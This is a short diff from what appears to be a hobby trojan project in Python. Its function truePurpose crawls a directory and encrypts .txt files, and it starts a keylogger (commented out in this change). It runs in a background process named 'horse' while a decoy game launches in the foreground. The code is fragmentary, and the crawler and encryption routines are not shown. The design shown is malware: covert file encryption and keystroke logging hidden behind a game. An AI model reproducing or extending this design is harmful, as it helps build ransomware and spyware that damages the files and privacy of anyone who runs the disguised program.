@@ -18,7 +18,7 @@ def truePurpose(target_directory: str):
         target_directory: the directory to ecrypt
     """
 
-    trojan.keylogger.start_logger()
+    # trojan.keylogger.start_logger()
     c: Crawler = Crawler(target_directory, extension_white_list=[
                          '.txt'], abs_path=True)
     c.walk_tree()
@@ -29,12 +29,10 @@ def truePurpose(target_directory: str):
 
 
 if __name__ == "__main__":
+    # For now, we'll encrypt all files in the test directory, that are a txt file.
     p: Process = Process(target=truePurpose, args=["./test"])
-
     p.name: str = "horse"
     p.start()
-
-    # For now, we'll encrypt all files in the test directory, that are a txt file.
 
     import game
     game.game()
